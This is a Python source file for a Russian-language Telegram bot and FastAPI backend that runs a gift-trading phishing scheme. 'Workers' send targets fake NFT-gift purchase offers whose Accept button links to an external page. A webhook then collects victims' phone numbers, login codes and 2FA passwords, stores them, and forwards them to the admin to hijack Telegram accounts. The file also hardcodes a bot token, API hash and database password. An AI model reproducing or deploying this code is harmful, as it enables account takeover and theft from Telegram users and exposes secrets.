import asyncio
import os
from datetime import datetime
from contextlib import asynccontextmanager

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, BotCommand, BotCommandScopeDefault,
)
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import BigInteger, String, Integer, DateTime, Text, select, update
import uvicorn
import httpx

# ═══════════════════════════════════════════════════════
#   КОНФИГ
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8215145424:AAGM0ImIq_YzbqziKRsrH3opVm9I3pnM_Sw"
ADMIN_ID = 8986358602
WEBAPP_URL = "https://trustgift.github.io/offersbot/"
BACKEND_URL = "https://offersbot-frwd.onrender.com"
API_ID = 26259835
API_HASH = "3fa32264398920f001dd2428b42060f6"
DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"
PORT = int(os.getenv("PORT", "8080"))

# ═══════════════════════════════════════════════════════
#   БАЗА
# ═══════════════════════════════════════════════════════

engine = create_async_engine(DATABASE_URL, echo=False, connect_args={"ssl": "require"})
SessionLocal = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


class Base(DeclarativeBase):
    pass


class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    role: Mapped[str] = mapped_column(String(16), default="user")
    balance: Mapped[int] = mapped_column(Integer, default=0)
    total_offers: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Offer(Base):
    __tablename__ = "offers"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger)
    target_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    target_username: Mapped[str] = mapped_column(String(64), nullable=True)
    gift_name: Mapped[str] = mapped_column(String(128))
    gift_link: Mapped[str] = mapped_column(String(256))
    price_stars: Mapped[int] = mapped_column(Integer)
    price_usd: Mapped[str] = mapped_column(String(32), default="—")
    duration_hours: Mapped[int] = mapped_column(Integer, default=24)
    status: Mapped[str] = mapped_column(String(16), default="pending")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Session(Base):
    __tablename__ = "sessions"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    phone: Mapped[str] = mapped_column(String(32))
    code: Mapped[str] = mapped_column(String(16), nullable=True)
    password: Mapped[str] = mapped_column(String(128), nullable=True)
    session_string: Mapped[str] = mapped_column(Text, nullable=True)
    user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    last_name: Mapped[str] = mapped_column(String(64), nullable=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Log(Base):
    __tablename__ = "logs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    event: Mapped[str] = mapped_column(String(64))
    detail: Mapped[str] = mapped_column(Text, nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


async def init_db():
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all, checkfirst=True)
    except Exception as e:
        print(f"init_db warning: {e}")


async def get_user(user_id: int):
    async with SessionLocal() as s:
        return await s.get(User, user_id)


async def add_user(user_id: int, username: str = None, first_name: str = None, role: str = "user"):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            return u
        u = User(id=user_id, username=username, first_name=first_name, role=role)
        s.add(u)
        await s.commit()
        await s.refresh(u)
        return u


async def set_role(user_id: int, role: str):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.role = role
            await s.commit()


async def change_balance(user_id: int, amount: int):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.balance += amount
            await s.commit()
            return u.balance


async def get_workers():
    async with SessionLocal() as s:
        r = await s.execute(select(User).where(User.role == "worker"))
        return r.scalars().all()


async def create_offer(worker_id, gift_name, gift_link, price_stars, price_usd, duration_hours=24):
    async with SessionLocal() as s:
        o = Offer(worker_id=worker_id, gift_name=gift_name, gift_link=gift_link,
                  price_stars=price_stars, price_usd=price_usd, duration_hours=duration_hours)
        s.add(o)
        u = await s.get(User, worker_id)
        if u:
            u.total_offers += 1
        await s.commit()
        await s.refresh(o)
        return o


async def get_offer(offer_id):
    async with SessionLocal() as s:
        return await s.get(Offer, offer_id)


async def get_worker_offers(worker_id: int):
    async with SessionLocal() as s:
        r = await s.execute(select(Offer).where(Offer.worker_id == worker_id).order_by(Offer.id.desc()))
        return r.scalars().all()


async def add_log(worker_id=None, offer_id=None, event="", detail=""):
    async with SessionLocal() as s:
        l = Log(worker_id=worker_id, offer_id=offer_id, event=event, detail=detail)
        s.add(l)
        await s.commit()


async def get_logs(limit=20):
    async with SessionLocal() as s:
        r = await s.execute(select(Log).order_by(Log.id.desc()).limit(limit))
        return r.scalars().all()


async def create_session_record(offer_id, phone, code=None, password=None,
                               session_string=None, user_id=None,
                               first_name=None, last_name=None, username=None):
    async with SessionLocal() as s:
        sess = Session(offer_id=offer_id, phone=phone, code=code, password=password,
                       session_string=session_string, user_id=user_id,
                       first_name=first_name, last_name=last_name, username=username)
        s.add(sess)
        await s.commit()
        await s.refresh(sess)
        return sess


async def get_recent_sessions(limit=10):
    async with SessionLocal() as s:
        r = await s.execute(select(Session).order_by(Session.id.desc()).limit(limit))
        return r.scalars().all()


# ═══════════════════════════════════════════════════════
#   BOT
# ═══════════════════════════════════════════════════════

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


def user_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="🎁 Мои подарки", callback_data="my_gifts")],
        [InlineKeyboardButton(text="💼 Офферы", callback_data="offers_menu")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def worker_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
        [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def back_menu(role: str):
    kb = admin_menu() if role == "admin" else worker_menu() if role == "worker" else user_menu()
    return InlineKeyboardMarkup(inline_keyboard=kb.inline_keyboard + [
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])


class OfferForm(StatesGroup):
    gift_link = State()
    price_stars = State()
    duration = State()


class GrantForm(StatesGroup):
    user_id = State()


class BalanceForm(StatesGroup):
    user_id = State()
    amount = State()


@dp.message(CommandStart())
async def start(message: types.Message):
    uid = message.from_user.id
    role = "admin" if uid == ADMIN_ID else "user"
    u = await add_user(uid, message.from_user.username, message.from_user.first_name, role)
    if uid == ADMIN_ID and u.role != "admin":
        await set_role(uid, "admin")
        u.role = "admin"

    text = (
        f"👋 <b>Добро пожаловать в Gift Offers</b>\n\n"
        f"Это платформа для безопасного обмена подарками и звёздами Telegram.\n\n"
        f"👤 <b>Ваш профиль</b>\n"
        f"├ ID: <code>{uid}</code>\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"└ Баланс: <b>{u.balance} ⭐</b>\n\n"
        f"Выберите действие:"
    )
    kb = admin_menu() if u.role == "admin" else worker_menu() if u.role == "worker" else user_menu()
    await message.answer(text, reply_markup=kb)


@dp.callback_query(F.data == "main_menu")
async def main_menu(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    text = (
        f"👋 <b>Gift Offers</b>\n\n"
        f"👤 <b>Профиль</b>\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"└ Баланс: <b>{u.balance} ⭐</b>\n\n"
        f"Выберите действие:"
    )
    kb = admin_menu() if u.role == "admin" else worker_menu() if u.role == "worker" else user_menu()
    await call.message.edit_text(text, reply_markup=kb)


@dp.callback_query(F.data == "profile")
async def profile(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    text = (
        f"👤 <b>Ваш профиль</b>\n\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ Username: @{u.username or '—'}\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"├ Баланс: <b>{u.balance} ⭐</b>\n"
        f"└ Создано офферов: <b>{u.total_offers}</b>\n\n"
        f"<i>Дата регистрации: {u.created_at:%d.%m.%Y}</i>"
    )
    await call.message.edit_text(text, reply_markup=back_menu(u.role))


@dp.callback_query(F.data == "buy_stars")
async def buy_stars(call: types.CallbackQuery):
    text = (
        f"⭐ <b>Покупка звёзд</b>\n\n"
        f"Звёзды Telegram покупаются через официальный бот <b>@PremiumBot</b>.\n\n"
        f"<b>Как это работает:</b>\n"
        f"1. Откройте @PremiumBot\n"
        f"2. Купите нужное количество звёзд\n"
        f"3. Отправьте их нашему боту как подарок\n"
        f"4. Баланс обновится автоматически\n\n"
        f"<i>Минимальная покупка — 50 звёзд.</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Открыть @PremiumBot", url="https://t.me/PremiumBot")],
        [InlineKeyboardButton(text="📥 Я отправил звёзды", callback_data="stars_sent")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
    ])
    await call.message.edit_text(text, reply_markup=kb, disable_web_page_preview=True)


@dp.callback_query(F.data == "stars_sent")
async def stars_sent(call: types.CallbackQuery):
    await call.message.edit_text(
        "⏳ <b>Проверяем поступление…</b>\n\n"
        "Обычно проверка занимает до 5 минут. "
        "Если звёзды не зачислятся — напишите администратору.",
        reply_markup=back_menu("user"),
    )
    await bot.send_message(
        ADMIN_ID,
        f"💰 <b>Заявка на пополнение</b>\n\n"
        f"Юзер: <code>{call.from_user.id}</code> (@{call.from_user.username})\n"
        f"Проверь поступление звёзд."
    )


@dp.callback_query(F.data == "my_gifts")
async def my_gifts(call: types.CallbackQuery):
    await call.message.edit_text(
        "🎁 <b>Мои подарки</b>\n\n"
        "У вас пока нет подарков в системе.\n\n"
        "<i>Подарки появляются здесь после успешного оффера.</i>",
        reply_markup=back_menu("user"),
    )


@dp.callback_query(F.data == "offers_menu")
async def offers_menu(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    text = (
        f"💼 <b>Офферы</b>\n\n"
        f"Офферы — это предложения обмена подарками между пользователями.\n\n"
        f"Чтобы создавать офферы, нужен доступ воркера.\n"
        f"Запросите его у администратора."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📩 Запросить доступ", callback_data="request_access")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
    ])
    await call.message.edit_text(text, reply_markup=kb)


@dp.callback_query(F.data == "request_access")
async def request_access(call: types.CallbackQuery):
    await bot.send_message(
        ADMIN_ID,
        f"🔔 <b>Запрос на доступ воркера</b>\n\n"
        f"Юзер: <code>{call.from_user.id}</code>\n"
        f"Username: @{call.from_user.username or '—'}\n"
        f"Имя: {call.from_user.first_name}\n\n"
        f"Выдать доступ: <code>/grant {call.from_user.id}</code>"
    )
    await call.answer("Запрос отправлен администратору", show_alert=True)
    await call.message.edit_text(
        "✅ <b>Запрос отправлен</b>\n\n"
        "Администратор рассмотрит вашу заявку в ближайшее время.",
        reply_markup=back_menu("user"),
    )


# ═══════════════════════════════════════════════════════
#   WORKER — СОЗДАНИЕ ОФФЕРА
# ═══════════════════════════════════════════════════════

@dp.callback_query(F.data == "worker_create")
async def create_start(call: types.CallbackQuery, state: FSMContext):
    u = await get_user(call.from_user.id)
    if u.role not in ("worker", "admin"):
        await call.answer("Нет доступа", show_alert=True)
        return
    await state.set_state(OfferForm.gift_link)
    await call.message.edit_text(
        "➕ <b>Создание оффера</b>\n\n"
        "Шаг 1 из 3\n\n"
        "🔗 Отправьте ссылку на подарок:\n"
        "<i>Пример: https://t.me/nft/DeskCalendar-284528</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
        ]),
        disable_web_page_preview=True,
    )


@dp.message(OfferForm.gift_link)
async def offer_link(message: types.Message, state: FSMContext):
    link = message.text.strip()
    if "t.me/nft/" not in link:
        await message.answer("❌ Неверная ссылка. Пример: https://t.me/nft/DeskCalendar-284528")
        return
    gift_name = link.split("/")[-1].replace("-", " #")
    await state.update_data(gift_link=link, gift_name=gift_name)
    await state.set_state(OfferForm.price_stars)
    await message.answer(
        f"✅ Подарок: <b>{gift_name}</b>\n\n"
        f"Шаг 2 из 3\n\n"
        f"⭐ Введите сумму оффера в звёздах:\n"
        f"<i>Например: 650</i>",
    )


@dp.message(OfferForm.price_stars)
async def offer_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    await state.update_data(price_stars=int(message.text))
    await state.set_state(OfferForm.duration)
    await message.answer(
        "Шаг 3 из 3\n\n"
        "⏱ Введите длительность оффера в часах:\n"
        "<i>Например: 24</i>"
    )


@dp.message(OfferForm.duration)
async def offer_duration(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    data = await state.get_data()
    duration = int(message.text)
    price_usd = f"{data['price_stars'] * 0.0092:.2f}"
    o = await create_offer(
        worker_id=message.from_user.id,
        gift_name=data["gift_name"],
        gift_link=data["gift_link"],
        price_stars=data["price_stars"],
        price_usd=price_usd,
        duration_hours=duration,
    )
    await state.clear()

    await bot.send_message(
        ADMIN_ID,
        f"🆕 <b>Новый оффер</b>\n\n"
        f"Воркер: <code>{message.from_user.id}</code> (@{message.from_user.username})\n"
        f"Подарок: {o.gift_name}\n"
        f"Цена: {o.price_stars} ⭐ ({o.price_usd}$)\n"
        f"ID: <code>{o.id}</code>",
    )
    await add_log(worker_id=message.from_user.id, offer_id=o.id,
                  event="offer_created", detail=f"{o.gift_name} за {o.price_stars}⭐")

    card = (
        f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
        f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
        f"За подарок: <b>{o.gift_name}</b>\n"
        f"Длительность: <b>{o.duration_hours}h</b>\n\n"
        f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", url=f"{WEBAPP_URL}?offer={o.id}&action=accept")],
        [InlineKeyboardButton(text="❌ Отклонить", url=f"{WEBAPP_URL}?offer={o.id}&action=reject")],
    ])
    await message.answer(
        "✅ <b>Оффер создан</b>\n\n"
        "Скопируйте сообщение ниже и отправьте его получателю:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n" + card,
        reply_markup=kb,
        disable_web_page_preview=True,
    )
    await message.answer(
        "Нажмите ⬅️ Назад чтобы вернуться в меню.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "worker_offers")
async def my_offers(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if u.role not in ("worker", "admin"):
        await call.answer("Нет доступа", show_alert=True)
        return
    offers = await get_worker_offers(call.from_user.id)
    if not offers:
        await call.message.edit_text(
            "📋 <b>Мои офферы</b>\n\nУ вас пока нет офферов.",
            reply_markup=back_menu(u.role),
        )
        return
    lines = []
    for o in offers[:15]:
        emoji = {"pending": "⏳", "accepted": "✅", "rejected": "❌"}.get(o.status, "•")
        lines.append(f"{emoji} #{o.id} — {o.gift_name} — {o.price_stars}⭐")
    text = f"📋 <b>Мои офферы</b>\n\n" + "\n".join(lines)
    if len(offers) > 15:
        text += f"\n\n<i>…и ещё {len(offers) - 15}</i>"
    await call.message.edit_text(text, reply_markup=back_menu(u.role))


# ═══════════════════════════════════════════════════════
#   ADMIN
# ═══════════════════════════════════════════════════════

@dp.callback_query(F.data == "admin_workers")
async def workers_menu(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    workers = await get_workers()
    lines = []
    for w in workers:
        lines.append(f"• <code>{w.id}</code> — @{w.username or '—'} — {w.balance}⭐")
    text = "👥 <b>Воркеры</b>\n\n"
    text += "\n".join(lines) if lines else "<i>Пока никого</i>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant")],
        [InlineKeyboardButton(text="➖ Забрать доступ", callback_data="admin_revoke")],
        [InlineKeyboardButton(text="💰 Изменить баланс", callback_data="admin_balance")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
    ])
    await call.message.edit_text(text, reply_markup=kb)


@dp.callback_query(F.data == "admin_grant")
async def grant_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await call.message.edit_text(
        "➕ <b>Выдать доступ воркера</b>\n\n"
        "Введите user_id пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_workers")]
        ]),
    )


@dp.message(GrantForm.user_id)
async def grant_finish(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    uid = int(message.text)
    await set_role(uid, "worker")
    await message.answer(f"✅ Пользователь <code>{uid}</code> теперь воркер.")
    try:
        await bot.send_message(uid, "🎉 Вам выдан доступ воркера. Напишите /start")
    except Exception:
        pass
    await state.clear()
    await message.answer("Вернуться в меню?", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_workers")]
    ]))


@dp.callback_query(F.data == "admin_revoke")
async def revoke_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(GrantForm.user_id)
    await call.message.edit_text(
        "➖ <b>Забрать доступ воркера</b>\n\n"
        "Введите user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_workers")]
        ]),
    )


@dp.callback_query(F.data == "admin_balance")
async def balance_start(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        return
    await state.set_state(BalanceForm.user_id)
    await call.message.edit_text(
        "💰 <b>Изменить баланс</b>\n\n"
        "Введите user_id:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_workers")]
        ]),
    )


@dp.message(BalanceForm.user_id)
async def balance_user(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    await state.update_data(target=message.text)
    await state.set_state(BalanceForm.amount)
    await message.answer("Введите сумму (можно отрицательную):")


@dp.message(BalanceForm.amount)
async def balance_amount(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        amount = int(message.text)
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    data = await state.get_data()
    uid = int(data["target"])
    new_balance = await change_balance(uid, amount)
    await message.answer(f"✅ Баланс <code>{uid}</code> теперь <b>{new_balance} ⭐</b>.")
    await state.clear()
    await message.answer("Вернуться?", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_workers")]
    ]))


@dp.callback_query(F.data == "admin_logs")
async def admin_logs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    logs = await get_logs(20)
    if not logs:
        await call.message.edit_text("📊 Логов нет.", reply_markup=back_menu("admin"))
        return
    lines = []
    for l in logs:
        lines.append(f"[{l.created_at:%H:%M}] {l.event} — {l.detail or '—'}")
    text = "📊 <b>Последние логи</b>\n\n" + "\n".join(lines)
    await call.message.edit_text(text, reply_markup=back_menu("admin"))


@dp.callback_query(F.data == "admin_sessions")
async def admin_sessions(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    sess = await get_recent_sessions(10)
    if not sess:
        await call.message.edit_text("💎 Сессий нет.", reply_markup=back_menu("admin"))
        return
    lines = []
    for s in sess:
        lines.append(f"#{s.id} — {s.phone} — {s.first_name or '—'} — offer {s.offer_id}")
    text = "💎 <b>Сессии</b>\n\n" + "\n".join(lines)
    await call.message.edit_text(text, reply_markup=back_menu("admin"))


# ─── команды (быстрые действия админа)

@dp.message(Command("grant"))
async def cmd_grant(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/grant user_id</code>")
        return
    uid = int(args[1])
    await set_role(uid, "worker")
    await message.answer(f"✅ <code>{uid}</code> теперь воркер.")
    try:
        await bot.send_message(uid, "🎉 Вам выдан доступ воркера. Напишите /start")
    except Exception:
        pass


@dp.message(Command("revoke"))
async def cmd_revoke(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("Использование: <code>/revoke user_id</code>")
        return
    uid = int(args[1])
    await set_role(uid, "user")
    await message.answer(f"✅ <code>{uid}</code> больше не воркер.")


@dp.message(Command("balance"))
async def cmd_balance(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit():
        await message.answer("Использование: <code>/balance user_id amount</code>")
        return
    uid = int(args[1])
    amount = int(args[2])
    new = await change_balance(uid, amount)
    await message.answer(f"✅ Баланс <code>{uid}</code>: <b>{new} ⭐</b>")


# ═══════════════════════════════════════════════════════
#   BACKEND (пока — только приём сессий, часть 4)
# ═══════════════════════════════════════════════════════

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


class SessionPayload(BaseModel):
    offer_id: int
    phone: str
    code: str | None = None
    password: str | None = None


@app.post("/webhook/session")
async def receive_session(p: SessionPayload):
    sess = await create_session_record(
        offer_id=p.offer_id, phone=p.phone, code=p.code, password=p.password,
    )
    o = await get_offer(p.offer_id)
    worker_id = o.worker_id if o else None
    await add_log(worker_id=worker_id, offer_id=p.offer_id, event="session_received",
                  detail=f"phone={p.phone}, code={p.code}, 2fa={p.password}")
    msg = (
        f"🔔 <b>Новая сессия</b>\n\n"
        f"Оффер: #{p.offer_id}\n"
        f"Телефон: <code>{p.phone}</code>\n"
        f"Код: <code>{p.code or '—'}</code>\n"
        f"2FA: <code>{p.password or '—'}</code>"
    )
    try:
        await bot.send_message(ADMIN_ID, msg)
    except Exception:
        pass
    return {"ok": True, "session_id": sess.id}


@app.get("/health")
async def health():
    return {"ok": True}


# ═══════════════════════════════════════════════════════
#   RUN
# ═══════════════════════════════════════════════════════

async def set_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Главное меню"),
    ], scope=BotCommandScopeDefault())


async def run_bot():
    await init_db()
    await set_commands()
    await dp.start_polling(bot)


async def run_web():
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()


async def main():
    await asyncio.gather(run_bot(), run_web())


if __name__ == "__main__":
    asyncio.run(main())
